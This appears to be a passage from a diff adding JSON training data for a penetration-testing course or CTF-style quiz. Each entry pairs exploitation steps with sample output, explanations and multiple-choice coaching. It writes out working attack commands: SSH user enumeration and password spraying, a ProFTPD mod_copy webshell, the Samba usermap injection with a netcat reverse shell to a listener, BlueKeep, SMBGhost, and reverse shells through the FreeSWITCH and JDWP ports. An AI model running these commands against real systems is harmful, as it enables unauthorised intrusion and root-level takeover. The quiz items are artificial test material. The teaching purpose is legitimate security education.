+              "teach": "7.2 is before 7.7, so CVE-2018-15473 applies. A 7.7 or newer banner means this enumeration is closed and you should brute or look elsewhere."
+            }
+          ]
+        },
+        {
+          "key": "names",
+          "label": "You built a candidate list",
+          "steps": [
+            {
+              "title": "Gather likely usernames",
+              "tool": "sh",
+              "where": "local",
+              "cmd": "cat users.txt",
+              "out": "root\nadmin\nadministrator\nj.smith",
+              "sig": "j.smith",
+              "teach": "Seed the list from names you saw on the website, in SMTP, or in a breach wordlist; the enumeration tells you which are real."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Username enumeration is confirm the version, run the check, then act only on the valid names.",
+        "items": [
+          {
+            "t": "Confirm the version is vulnerable",
+            "d": "Only OpenSSH before 7.7 leaks usernames this way. Read the banner with nc or nmap -sV before spending time on it.",
+            "demo": [
+              {
+                "run": "nmap -sV -p22 <target>",
+                "out": "22/tcp open  ssh  OpenSSH 7.2p2 Ubuntu",
+                "sig": "OpenSSH 7.2p2"
+              }
+            ],
+            "note": "A newer banner closes this path; do not keep trying the enumeration against a patched server."
+          },
+          {
+            "t": "Run the enumeration",
+            "d": "The Metasploit ssh_enumusers module or a standalone CVE-2018-15473 script sends the malformed auth and sorts valid from invalid.",
+            "demo": [
+              {
+                "run": "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS <target>; set USER_FILE users.txt; run; exit'",
+                "out": "[+] <target> - User 'administrator' found\n[-] <target> - User 'admin' not found",
+                "sig": "User 'administrator' found"
+              }
+            ],
+            "note": "Either tool is fine; the signal is the same split between found and not found."
+          },
+          {
+            "t": "Spray only the valid users",
+            "d": "A confirmed account list makes the password spray targeted. Spray one password across the valid names and watch the lockout policy.",
+            "demo": [
+              {
+                "run": "hydra -L valid_users.txt -p 'Autumn2024!' ssh://<target>",
+                "out": "[22][ssh] host: <target>   login: j.smith   password: Autumn2024!",
+                "sig": "login: j.smith   password: Autumn2024!"
+              }
+            ],
+            "note": "One hit and you have a foothold; the enumeration is what made the spray cheap enough to try."
+          }
+        ]
+      },
+      "situation": "A scan shows 22/tcp running OpenSSH 7.2p2 and you have a wordlist of candidate names. What is the move?",
+      "choices": [
+        "ssh-user-enum",
+        "online-brute-ssh",
+        "ssh-key-login",
+        "crack-identify"
+      ],
+      "coach": {
+        "online-brute-ssh": "Brute is the next step, but enumerate valid users first on this pre-7.7 OpenSSH so you only spray accounts that exist.",
+        "ssh-key-login": "You have no private key yet; first find which users exist.",
+        "crack-identify": "You have no hash; this is username discovery, not cracking."
+      }
+    },
+    "smtp-open-relay": {
+      "why": "You are testing whether the mail server will send mail for anyone, which is a reportable misconfiguration and a lever for phishing. It is a finding for the report, not a shell by itself. In practice, you reach for this step when when 25 is open and you want to test for a relay, a reportable finding. Success looks like: The script reports whether the server relayed its tests.",
+      "cmd": "nmap --script smtp-open-relay -p25 10.10.10.10",
+      "tool": "nmap",
+      "output": "PORT   STATE SERVICE\n25/tcp open  smtp\n| smtp-open-relay: Server is an open relay (14/16 tests)\n|_ MAIL FROM:<antispam@example.com> -> RCPT TO:<relaytest@nmap.scanme.org>",
+      "signal": "Server is an open relay",
+      "teach": "The script relayed mail that neither came from nor was destined for this server's own domains. That is an open relay; record it as a finding, and you can use it to send spoofed internal mail to a real user.",
+      "leadup": [
+        {
+          "key": "scan",
+          "label": "The scan found 25",
+          "steps": [
+            {
+              "title": "Spot the mail service",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p25 <target>",
+              "out": "25/tcp open  smtp",
+              "sig": "25/tcp open  smtp",
+              "teach": "Port 25 is SMTP; the two quick wins are username enumeration and the open-relay test, both costless."
+            }
+          ]
+        },
+        {
+          "key": "banner",
+          "label": "The banner named the server",
+          "steps": [
+            {
+              "title": "Read the SMTP banner",
+              "tool": "telnet",
+              "where": "local",
+              "cmd": "telnet <target> 25",
+              "out": "220 mail.acme.internal ESMTP Postfix",
+              "sig": "220 mail.acme.internal ESMTP Postfix",
+              "teach": "The banner names the mail software and the domain it serves; the relay test uses addresses outside that domain."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Testing a relay is one scan, or a short manual conversation, then knowing what you are looking at.",
+        "items": [
+          {
+            "t": "Scan it in one shot",
+            "d": "The nmap smtp-open-relay script runs sixteen relay patterns and reports whether any are accepted.",
+            "demo": [
+              {
+                "run": "nmap --script smtp-open-relay -p25 <target>",
+                "out": "| smtp-open-relay: Server is an open relay (14/16 tests)",
+                "sig": "Server is an open relay"
+              }
+            ],
+            "note": "Any accepted test is a positive; the fraction tells you how permissive the server is."
+          },
+          {
+            "t": "Prove it by hand",
+            "d": "A manual session makes the finding concrete. HELO, then a MAIL FROM and RCPT TO that are both external, and watch for a 250 on the recipient.",
+            "demo": [
+              {
+                "run": "swaks --to external@gmail.com --from spoof@external.net --server <target>",
+                "out": "<- 250 2.1.5 Ok\n<- 250 2.0.0 Ok: queued",
+                "sig": "250 2.1.5 Ok"
+              }
+            ],
+            "note": "A 250 after RCPT TO an outside address is the relay accepting; a 554 or 550 is a correctly locked server."
+          },
+          {
+            "t": "Know the difference",
+            "d": "Open relay is about forwarding mail for outsiders. VRFY and EXPN user enumeration is a separate check that confirms which local mailboxes exist. Run both, but report them as distinct findings.",
+            "note": "Confusing the two costs you marks; the relay has no credential, the user enum has no forwarding."
+          }
+        ]
+      },
+      "situation": "25/tcp is open and you want to test the mail server's configuration for a reportable weakness. What confirms an open relay?",
+      "choices": [
+        "smtp-open-relay",
+        "recon-smtp",
+        "recon-mail",
+        "password-spray"
+      ],
+      "coach": {
+        "recon-smtp": "VRFY and EXPN user enumeration is a different check; the open-relay test is about whether the server forwards mail for outsiders.",
+        "recon-mail": "Reading a mailbox needs a credential you do not have; the relay test needs none.",
+        "password-spray": "No credentials or user list are in play here; this is a configuration test, not an authentication attack."
+      }
+    },
+    "ftp-bounce": {
+      "why": "An old FTP trick makes the server scan machines you cannot reach directly, mapping a hidden network segment on the way to deeper targets. In practice, you reach for this step when when an old FTP server can reach a segment you cannot reach directly. Success looks like: You reach an ftp prompt.",
+      "cmd": "nmap -b anonymous:anonymous@10.10.10.10 -p 3306,6379,8080 172.16.5.10",
+      "tool": "nmap",
+      "output": "Nmap scan report for 172.16.5.10\nPORT     STATE  SERVICE\n3306/tcp open   mysql\n6379/tcp closed redis\n8080/tcp open   http-proxy",
+      "signal": "3306/tcp open   mysql",
+      "teach": "The FTP server relayed the scan and reported 3306 and 8080 open on an internal host you could not reach directly. That is a map of your next target; pivot toward the services it exposed.",
+      "leadup": [
+        {
+          "key": "anon",
+          "label": "Anonymous FTP works",
+          "steps": [
+            {
+              "title": "Log in anonymously",
+              "tool": "ftp",
+              "where": "local",
+              "cmd": "ftp <target>",
+              "out": "Name (<target>): anonymous\n230 Login successful.",
+              "sig": "230 Login successful.",
+              "teach": "You must be logged in to issue PORT, and anonymous is enough; the bounce does not need a privileged account."
+            }
+          ]
+        },
+        {
+          "key": "port",
+          "label": "The server honors PORT",
+          "steps": [
+            {
+              "title": "Test the PORT command",
+              "tool": "ftp",
+              "where": "target",
+              "cmd": "quote PORT 172,16,5,10,0,3306",
+              "out": "200 PORT command successful.",
+              "sig": "200 PORT command successful.",
+              "teach": "A 200 means the server will open data connections where you tell it; a 500 means the bounce is blocked and this path is closed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "A bounce is confirm a login, confirm the PORT command, then let nmap scan through the server.",
+        "items": [
+          {
+            "t": "Confirm a login",
+            "d": "You need to be authenticated to issue PORT, but anonymous almost always suffices on a bounce-capable server.",
+            "demo": [
+              {
+                "run": "ftp <target>",
+                "out": "230 Login successful.",
+                "sig": "230 Login successful."
+              }
+            ],
+            "note": "No anonymous and no credential means no bounce; move on."
+          },
+          {
+            "t": "Test the PORT command",
+            "d": "Issue a raw PORT aimed at an internal host and port. A 200 is a green light; a 500 or 501 means the server refuses redirected data connections.",
+            "demo": [
+              {
+                "run": "quote PORT 172,16,5,10,0,3306",
+                "out": "200 PORT command successful.",
+                "sig": "200 PORT command successful."
+              }
+            ],
+            "note": "The last two numbers encode the port: 0,3306 means high-byte 0 times 256 plus 3306."
+          },
+          {
+            "t": "Scan through it",
+            "d": "nmap -b wraps the whole dance. Point it at the FTP server for the bounce and at the internal host for the target.",
+            "demo": [
+              {
+                "run": "nmap -b anonymous:anonymous@<target> -p 1-1000 172.16.5.10",
+                "out": "3306/tcp open   mysql\n8080/tcp open   http-proxy",
+                "sig": "3306/tcp open   mysql"
+              }
+            ],
+            "note": "The open ports on the internal host are your pivot shortlist; chase the service you know how to attack."
+          }
+        ]
+      },
+      "situation": "An anonymous FTP server on 10.10.10.10 accepts the PORT command, and 172.16.5.10 is unreachable from your box. What is the move?",
+      "choices": [
+        "ftp-bounce",
+        "recon-ftp",
+        "ftp-upload-webshell",
+        "online-brute-ftp"
+      ],
+      "coach": {
+        "recon-ftp": "You already enumerated the FTP share; the new opportunity is bouncing a scan through it to an internal host you cannot otherwise reach.",
+        "ftp-upload-webshell": "That needs a writable web root; here the lever is the PORT command, not an upload.",
+        "online-brute-ftp": "You already have anonymous access, which is all the bounce needs; no brute required."
+      }
+    },
+    "proftpd-modcopy": {
+      "why": "A flaw in this FTP server lets you copy a file you control into the website folder with no login, which you then run for code execution. In practice, you reach for this step when when 21 is open. Success looks like: The ProFTPD version prints.",
+      "cmd": "nmap -p21 -sV {{target}}",
+      "tool": "nmap",
+      "output": "PORT   STATE SERVICE VERSION\n21/tcp open  ftp     ProFTPD 1.3.5",
+      "signal": "ProFTPD 1.3.5",
+      "teach": "ProFTPD 1.3.5 exposes unauthenticated SITE CPFR and CPTO. Copy a PHP payload into a web-served directory, then request it for command execution.",
+      "leadup": [
+        {
+          "key": "banner",
+          "label": "The FTP banner names the version",
+          "steps": [
+            {
+              "title": "Version-scan the port",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p21 -sV {{target}}",
+              "out": "21/tcp open  ftp     ProFTPD 1.3.5",
+              "sig": "ProFTPD 1.3.5",
+              "teach": "The mod_copy commands are unauthenticated on 1.3.5, so the version is the gate."
+            }
+          ]
+        },
+        {
+          "key": "webroot",
+          "label": "You know a web-served path",
+          "steps": [
+            {
+              "title": "Find the web server on the same host",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s -I http://{{target}}/",
+              "out": "HTTP/1.1 200 OK\nServer: Apache/2.4.7 (Ubuntu)",
+              "sig": "Server: Apache",
+              "teach": "An Apache on the same host usually serves /var/www/html, which is your copy target."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "mod_copy is confirm 1.3.5, prove the copy works with a harmless file, then copy a PHP payload into the web root and call it.",
+        "items": [
+          {
+            "t": "Fingerprint the version",
+            "d": "The unauthenticated copy exists on 1.3.5 up to the patch, so confirm the banner first.",
+            "demo": [
+              {
+                "run": "nmap -p21 -sV {{target}}",
+                "out": "21/tcp open  ftp     ProFTPD 1.3.5",
+                "sig": "ProFTPD 1.3.5"
+              }
+            ],
+            "note": "A different version means mod_copy is likely patched or disabled."
+          },
+          {
+            "t": "Prove the copy primitive",
+            "d": "Copy a readable system file to a temp path to confirm CPFR and CPTO work before you stage a payload.",
+            "demo": [
+              {
+                "run": "nc {{target}} 21",
+                "out": "SITE CPFR /etc/passwd\n350 File or directory exists, ready for destination name\nSITE CPTO /tmp/passwd.copy\n250 Copy successful",
+                "sig": "250 Copy successful"
+              }
+            ],
+            "note": "A successful copy means you can write anywhere the FTP service user can."
+          },
+          {
+            "t": "Stage a webshell into the web root",
+            "d": "Copy a PHP payload into the directory the web server serves. The public exploit automates the two SITE commands.",
+            "demo": [
+              {
+                "run": "python2 36803.py {{target}} /var/www/html/",
+                "out": "[+] Copied payload to /var/www/html/shell.php",
+                "sig": "shell.php"
+              }
+            ],
+            "note": "Find the real web root first; /var/www/html is only the common default."
+          },
+          {
+            "t": "Run commands through it",
+            "d": "Request the webshell with a command; swap the command for a reverse-shell one-liner once it answers.",
+            "demo": [
+              {
+                "run": "curl 'http://{{target}}/shell.php?cmd=id'",
+                "out": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+                "sig": "www-data"
+              }
+            ],
+            "note": "You have execution as the web user; now upgrade to a shell and start enumerating for root."
+          }
+        ]
+      },
+      "situation": "FTP on port 21 banners as ProFTPD 1.3.5, and an Apache server runs on port 80. What is the move?",
+      "choices": [
+        "proftpd-modcopy",
+        "recon-ftp",
+        "online-brute-ftp",
+        "content-discovery"
+      ],
+      "coach": {
+        "recon-ftp": "Anonymous login may not even be needed; mod_copy writes a webshell without logging in.",
+        "online-brute-ftp": "No password required; the unauthenticated copy is the way in.",
+        "content-discovery": "Useful for finding the web root path, but the exploit itself is the FTP copy, not the directory brute."
+      }
+    },
+    "samba-usermap": {
+      "why": "A flaw in old Samba runs whatever you put in the username field as a command, as root. When the version matches, it is a direct root shell with no credentials. In practice, you reach for this step when when 139 or 445 is open on an old Linux Samba. Success looks like: nmap prints the Samba version.",
+      "cmd": "nmap -p139,445 --script smb-os-discovery {{target}}",
+      "tool": "nmap",
+      "output": "Host script results:\n| smb-os-discovery:\n|   OS: Unix (Samba 3.0.20-Debian)",
+      "signal": "Samba 3.0.20",
+      "teach": "Samba 3.0.20 through 3.0.25rc3 runs the username through a shell. Put a command in the username field of an anonymous IPC connection and it executes as root.",
+      "leadup": [
+        {
+          "key": "version",
+          "label": "The Samba version is in range",
+          "steps": [
+            {
+              "title": "Discover the Samba version",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p139,445 --script smb-os-discovery {{target}}",
+              "out": "|   OS: Unix (Samba 3.0.20-Debian)",
+              "sig": "Samba 3.0.20",
+              "teach": "The injection works from 3.0.20 to 3.0.25rc3 only; newer Samba is patched."
+            }
+          ]
+        },
+        {
+          "key": "nullsession",
+          "label": "Anonymous SMB answers",
+          "steps": [
+            {
+              "title": "List shares with a null session",
+              "tool": "smbclient",
+              "where": "local",
+              "cmd": "smbclient -L //{{target}}/ -N",
+              "out": "Sharename       Type      Comment\nIPC$            IPC       IPC Service",
+              "sig": "IPC$",
+              "teach": "An anonymous IPC connection is the delivery channel for the injected username."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "usermap is confirm the version, start a listener, then connect to IPC$ with a command hidden in the username.",
+        "items": [
+          {
+            "t": "Fingerprint the version",
+            "d": "The bug is specific to 3.0.20 through 3.0.25rc3, so confirm before you inject.",
+            "demo": [
+              {
+                "run": "nmap -p139,445 --script smb-os-discovery {{target}}",
+                "out": "|   OS: Unix (Samba 3.0.20-Debian)",
+                "sig": "Samba 3.0.20"
+              }
+            ],
+            "note": "Outside that range the username-map injection does not apply."
+          },
+          {
+            "t": "Start your listener",
+            "d": "The injected command calls back to you, so have a listener ready before you connect.",
+            "demo": [
+              {
+                "run": "nc -lvnp 4444",
+                "out": "listening on [any] 4444 ...",
+                "sig": "listening on"
+              }
+            ],
+            "note": "The reverse connection will land here as root."
+          },
+          {
+            "t": "Inject through the username",
+            "d": "The username is evaluated by a shell, so a backtick command runs as the Samba process user, which is root.",
+            "demo": [
+              {
+                "run": "smbclient //{{target}}/ipc$ -N -U \"./=`nohup nc {{lhost}} 4444 -e /bin/sh`\"",
+                "out": "session setup failed: NT_STATUS_LOGON_FAILURE",
+                "sig": "NT_STATUS_LOGON_FAILURE"
+              }
+            ],
+            "note": "The login fails on purpose; the command already ran. Check your listener."
+          },
+          {
+            "t": "Confirm root on the catch",
+            "d": "Your listener now holds the shell; confirm the identity and stabilise it.",
+            "demo": [
+              {
+                "run": "id",
+                "out": "uid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "You are root; capture proof and enumerate for the flags."
+          }
+        ]
+      },
+      "situation": "SMB on 139 and 445 reports Samba 3.0.20-Debian, and an anonymous connection lists the IPC$ share. What is the move?",
+      "choices": [
+        "samba-usermap",
+        "recon-smb-anon",
+        "smb-share-inventory",
+        "eternalblue"
+      ],
+      "coach": {
+        "recon-smb-anon": "Null-session enumeration is fine, but this version gives you a root shell directly through the username field.",
+        "smb-share-inventory": "Listing shares is useful, yet the version itself is the exploit here.",
+        "eternalblue": "That is MS17-010 on Windows SMB; this is Linux Samba, a different and older command-injection bug."
+      }
+    },
+    "smbghost": {
+      "why": "A flaw in a specific Windows file-sharing version can be pushed to full SYSTEM control. It is powerful but unstable, so it is a lab-only, snapshot-first move. In practice, you reach for this step when when 445 is open on Windows 10 1903 or 1909, or Server 2019. Success looks like: nmap confirms SMB 3.1.1.",
+      "cmd": "nmap -p445 --script smb-protocols {{target}}",
+      "tool": "nmap",
+      "output": "| smb-protocols:\n|   dialects:\n|     2:1:0\n|     3:0:0\n|     3:1:1",
+      "signal": "3:1:1",
+      "teach": "The host speaks SMB 3.1.1, the dialect the compression bug lives in. Confirm the exact build with a scanner, snapshot the box, then run the proof of concept.",
+      "leadup": [
+        {
+          "key": "dialect",
+          "label": "The host speaks SMB 3.1.1",
+          "steps": [
+            {
+              "title": "List the SMB dialects",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p445 --script smb-protocols {{target}}",
+              "out": "|     3:1:1",
+              "sig": "3:1:1",
+              "teach": "3.1.1 is required; older dialects do not have the compression feature the bug lives in."
+            }
+          ]
+        },
+        {
+          "key": "scanner",
+          "label": "A scanner confirms the bug",
+          "steps": [
+            {
+              "title": "Run the compression-flag scanner",
+              "tool": "python",
+              "where": "local",
+              "cmd": "python3 scanner.py {{target}}",
+              "out": "[+] 10.10.10.10 Vulnerable",
+              "sig": "Vulnerable",
+              "teach": "The scanner checks the compression capability flag, which is the real precondition, and is safe to run."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "SMBGhost is confirm SMB 3.1.1, run the scanner for a yes or no, snapshot the box, then the RCE proof of concept.",
+        "items": [
+          {
+            "t": "Confirm the dialect",
+            "d": "The bug lives in SMB 3.1.1 compression, so check the dialect before anything else.",
+            "demo": [
+              {
+                "run": "nmap -p445 --script smb-protocols {{target}}",
+                "out": "|     3:1:1",
+                "sig": "3:1:1"
+              }
+            ],
+            "note": "No 3.1.1, no SMBGhost; stop here."
+          },
+          {
+            "t": "Scan for the compression flag",
+            "d": "A dedicated scanner confirms the vulnerable build without touching memory, so it is your safe go or no-go.",
+            "demo": [
+              {
+                "run": "python3 scanner.py {{target}}",
+                "out": "[+] 10.10.10.10 Vulnerable",
+                "sig": "Vulnerable"
+              }
+            ],
+            "note": "Only a clear Vulnerable justifies risking the crash-prone exploit."
+          },
+          {
+            "t": "Snapshot, then run the PoC",
+            "d": "The RCE is unstable and can blue-screen the host, so snapshot or confirm a crash is acceptable first.",
+            "demo": [
+              {
+                "run": "python3 SMBGhost_RCE.py -ip {{target}}",
+                "out": "[+] Shellcode executed, check your listener",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "Edit the embedded shellcode to call back to {{lhost}}, and catch SYSTEM on your listener."
+          }
+        ]
+      },
+      "situation": "A host answers SMB on 445 speaking dialect 3.1.1, and it is Windows 10 build 1903. What is the move?",
+      "choices": [
+        "smbghost",
+        "eternalblue",
+        "recon-smb-anon",
+        "smb-share-inventory"
+      ],
+      "coach": {
+        "eternalblue": "MS17-010 is a different, older SMBv1 bug; 3.1.1 with compression is SMBGhost territory.",
+        "recon-smb-anon": "Enumeration is worth doing, but a confirmed SMBGhost build is a direct path to SYSTEM.",
+        "smb-share-inventory": "Listing shares needs access you may not have; the compression bug needs none."
+      }
+    },
+    "bluekeep": {
+      "why": "A flaw in old Windows remote desktop can be driven to SYSTEM with no login. It crashes often, so treat it as a lab-only, snapshot-first move. In practice, you reach for this step when when 3389 is open on Windows 7 or Server 2008 R2. Success looks like: The script reports VULNERABLE.",
+      "cmd": "nmap -p3389 --script rdp-vuln-ms19-0708 {{target}}",
+      "tool": "nmap",
+      "output": "| rdp-vuln-ms19-0708:\n|   VULNERABLE:\n|   Remote Desktop Protocol CVE-2019-0708\n|     State: VULNERABLE",
+      "signal": "VULNERABLE",
+      "teach": "The nmap script marks the host VULNERABLE to CVE-2019-0708. Pick the matching target profile in the exploit, then fire it where a crash is acceptable.",
+      "leadup": [
+        {
+          "key": "confirm",
+          "label": "The host is confirmed vulnerable",
+          "steps": [
+            {
+              "title": "Run the RDP vuln script",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p3389 --script rdp-vuln-ms19-0708 {{target}}",
+              "out": "|   VULNERABLE:\n|     State: VULNERABLE",
+              "sig": "VULNERABLE",
+              "teach": "This is the go or no-go; the PoC crashes targets that are not vulnerable."
+            }
+          ]
+        },
+        {
+          "key": "port",
+          "label": "RDP is open",
+          "steps": [
+            {
+              "title": "See the open RDP port",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p3389 {{target}}",
+              "out": "3389/tcp open  ms-wbt-server",
+              "sig": "3389/tcp open",
+              "teach": "RDP is listening; the version and patch level decide whether BlueKeep applies."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "BlueKeep is confirm vulnerable, set the right target profile, ready a listener, then fire and accept the crash risk.",
+        "items": [
+          {
+            "t": "Confirm the host is vulnerable",
+            "d": "The nmap script is non-destructive and tells you whether the patch is missing.",
+            "demo": [
+              {
+                "run": "nmap -p3389 --script rdp-vuln-ms19-0708 {{target}}",
+                "out": "|   VULNERABLE:",
+                "sig": "VULNERABLE"
+              }
+            ],
+            "note": "Never fire blind; the PoC blue-screens targets that are not vulnerable."
+          },
+          {
+            "t": "Set the target profile",
+            "d": "The module needs the memory layout for the target's platform and version; the wrong profile crashes it.",
+            "demo": [
+              {
+                "run": "msf6 exploit(cve_2019_0708_bluekeep_rce) > set target 2",
+                "out": "target => 2",
+                "sig": "target => 2"
+              }
+            ],
+            "note": "Match the profile to the host (physical, VMware, or Hyper-V) as the module notes describe."
+          },
+          {
+            "t": "Fire and catch SYSTEM",
+            "d": "With the profile set and a handler ready, run the exploit and watch for a session.",
+            "demo": [
+              {
+                "run": "msf6 exploit(cve_2019_0708_bluekeep_rce) > run",
+                "out": "[*] Meterpreter session 1 opened",
+                "sig": "session 1 opened"
+              }
+            ],
+            "note": "A session is SYSTEM; if it blue-screens instead, revisit the target profile."
+          }
+        ]
+      },
+      "situation": "RDP is open on 3389 and the nmap rdp-vuln script reports the host VULNERABLE to CVE-2019-0708. What is the move?",
+      "choices": [
+        "bluekeep",
+        "online-brute-rdp",
+        "rdp-enum",
+        "smbghost"
+      ],
+      "coach": {
+        "online-brute-rdp": "No credentials are needed; this is a pre-auth RCE, though it carries a crash risk that brute-forcing does not.",
+        "rdp-enum": "Enumeration confirmed the version already; the script says vulnerable, so the exploit is the move.",
+        "smbghost": "That is the SMBv3 compression bug on 445; this is the RDP pre-auth bug on 3389."
+      }
+    },
+    "freeswitch-esl": {
+      "why": "This phone server has a control port with a default password that runs commands. If it is open, that is a straight line to a shell. In practice, you reach for this step when when 8021 is open, on a VoIP server. Success looks like: The socket returns a status block.",
+      "cmd": "printf 'auth ClueCon\\n\\napi status\\n\\n' | nc -nv {{target}} 8021",
+      "tool": "nc",
+      "output": "+OK accepted\n+OK\nUP 0 years, 0 days, 1 hour, 2 minutes",
+      "signal": "+OK accepted",
+      "teach": "The socket accepted the default ClueCon password, so you can drive the API. The api system command runs OS commands; whoami shows the context, then stage a reverse shell.",
+      "leadup": [
+        {
+          "key": "auth",
+          "label": "The default password is accepted",
+          "steps": [
+            {
+              "title": "Send the default login",
+              "tool": "nc",
+              "where": "local",
+              "cmd": "printf 'auth ClueCon\\n\\napi status\\n\\n' | nc -nv {{target}} 8021",
+              "out": "+OK accepted\n+OK\nUP 0 years",
+              "sig": "+OK accepted",
+              "teach": "A default ClueCon login with no ACL is the whole vulnerability."
+            }
+          ]
+        },
+        {
+          "key": "port",
+          "label": "The event socket is open",
+          "steps": [
+            {
+              "title": "See the open port",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p8021 -sV {{target}}",
+              "out": "8021/tcp open  freeswitch-event",
+              "sig": "8021/tcp open",
+              "teach": "Port 8021 is the FreeSWITCH event socket; the default-password check comes next."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "FreeSWITCH ESL is confirm the default password, run whoami through the API, then stage a reverse shell with api system.",
+        "items": [
+          {
+            "t": "Confirm the default login",
+            "d": "Send auth ClueCon and an api status; a reply means the socket is open to you.",
+            "demo": [
+              {
+                "run": "printf 'auth ClueCon\\n\\napi status\\n\\n' | nc -nv {{target}} 8021",
+                "out": "+OK accepted",
+                "sig": "+OK accepted"
+              }
+            ],
+            "note": "No ACL plus the default password means the API is yours."
+          },
+          {
+            "t": "Check the execution context",
+            "d": "The api system command runs an OS command and returns its output.",
+            "demo": [
+              {
+                "run": "printf 'auth ClueCon\\n\\napi system whoami\\n\\n' | nc -nv {{target}} 8021",
+                "out": "+OK\nfreeswitch",
+                "sig": "freeswitch"
+              }
+            ],
+            "note": "On Windows this is often the high-privilege service account."
+          },
+          {
+            "t": "Stage a reverse shell",
+            "d": "Run a reverse-shell command through the API and catch it.",
+            "demo": [
+              {
+                "run": "python3 47799.py {{target}} 'nc {{lhost}} 4444 -e /bin/sh'",
+                "out": "(no body; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the api system command runs it."
+          }
+        ]
+      },
+      "situation": "Port 8021 is open and sending the ClueCon password returns +OK accepted. What is the move?",
+      "choices": [
+        "freeswitch-esl",
+        "online-brute-ssh",
+        "recon-web-triage",
+        "content-discovery"
+      ],
+      "coach": {
+        "online-brute-ssh": "No brute needed; the default password is already accepted on the event socket.",
+        "recon-web-triage": "This is not a web app; it is the FreeSWITCH control socket, which runs OS commands directly.",
+        "content-discovery": "Nothing to discover on an HTTP server here; the socket itself is the exploit."
+      }
+    },
+    "jdwp-debug": {
+      "why": "A Java debug port lets anyone who can reach it run code inside the program. That is a foothold, usually reached through a tunnel from another box. In practice, you reach for this step when when a Java debug port is reachable, often only through a pivot. Success looks like: The port echoes the handshake.",
+      "cmd": "(printf 'JDWP-Handshake'; sleep 1) | nc -nv {{target}} 8000",
+      "tool": "nc",
+      "output": "JDWP-Handshake",
+      "signal": "JDWP-Handshake",
+      "teach": "The port echoed JDWP-Handshake, so it speaks the debug protocol. jdwp-shellifier will invoke a command in the JVM; if the port is localhost-only, reach it through a tunnel.",
+      "leadup": [
+        {
+          "key": "handshake",
+          "label": "The port speaks JDWP",
+          "steps": [
+            {
+              "title": "Send the handshake",
+              "tool": "nc",
+              "where": "local",
+              "cmd": "(printf 'JDWP-Handshake'; sleep 1) | nc -nv {{target}} 8000",
+              "out": "JDWP-Handshake",
+              "sig": "JDWP-Handshake",
+              "teach": "An echo of the handshake confirms a live debug port you can attach to."
+            }
+          ]
+        },
+        {
+          "key": "pivot",
+          "label": "The port is reachable, often via a pivot",
+          "steps": [
+            {
+              "title": "Reach a localhost-bound port through the tunnel",
+              "tool": "proxychains",
+              "where": "local",
+              "cmd": "proxychains nc -nv 127.0.0.1 8000",
+              "out": "127.0.0.1 8000 port [tcp/*] succeeded",
+              "sig": "8000 port",
+              "teach": "JDWP is commonly bound to localhost; a SOCKS pivot reaches it from your box."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "JDWP is confirm the handshake, clone jdwp-shellifier, then inject a command that runs as the JVM user.",
+        "items": [
+          {
+            "t": "Confirm the debug port",
+            "d": "Send the JDWP handshake; the server echoes it when the port speaks the protocol.",
+            "demo": [
+              {
+                "run": "(printf 'JDWP-Handshake'; sleep 1) | nc -nv {{target}} 8000",
+                "out": "JDWP-Handshake",
+                "sig": "JDWP-Handshake"
+              }
+            ],
+            "note": "No echo means it is not JDWP, or you cannot reach it yet."
+          },
+          {
+            "t": "Get the tool",
+            "d": "jdwp-shellifier attaches, sets a breakpoint, and invokes a command; it needs python2.",
+            "demo": [
+              {
+                "run": "ls -l /opt/jdwp-shellifier/jdwp-shellifier.py",
+                "out": "-rwxr-xr-x 1 kali kali 19420 /opt/jdwp-shellifier/jdwp-shellifier.py",
+                "sig": "jdwp-shellifier.py"
+              }
+            ],
+            "note": "Run it with python2, not python3."
+          },
+          {
+            "t": "Inject a command",
+            "d": "Point the tool at the port with your command; it runs inside the JVM as its user.",
+            "demo": [
+              {
+                "run": "python2 jdwp-shellifier.py -t {{target}} -p 8000 --cmd 'busybox nc {{lhost}} 4444 -e /bin/bash'",
+                "out": "[+] Command string object created id:9a0",
+                "sig": "Command string object created"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the shell is the JVM user."
+          }
+        ]
+      },
+      "situation": "A port returns the string JDWP-Handshake when you send the handshake. What is the move?",
+      "choices": [
+        "jdwp-debug",
+        "recon-web-triage",
+        "online-brute-ssh",
+        "sqli-basics"
+      ],
+      "coach": {
+        "recon-web-triage": "This is a debug protocol, not HTTP; attach to the JVM and invoke a method.",
+        "online-brute-ssh": "No credentials are involved; the debug port is open by definition.",
+        "sqli-basics": "No database input; the execution happens inside the Java process."
+      }
+    },
+    "aerospike-udf": {
+      "why": "This database lets an unauthenticated user load a small function that runs commands. If the version matches, that is a shell as the database service user. In practice, you reach for this step when when 3000 to 3003 is open, often named as a web app backend. Success looks like: The port returns an Aerospike banner.",
+      "cmd": "nc -nv {{target}} 3000",
+      "tool": "nc",
+      "output": "Connection to {{target}} 3000 port [tcp/*] succeeded!",
+      "signal": "3000 port",
+      "teach": "Aerospike is reachable on 3000. If it is at or below 5.1.0.6, register a Lua UDF that runs a command, invoke it, and you have a shell as the aerospike user.",
+      "leadup": [
+        {
+          "key": "reachable",
+          "label": "The database port answers",
+          "steps": [
+            {
+              "title": "Touch the Aerospike port",
+              "tool": "nc",
+              "where": "local",
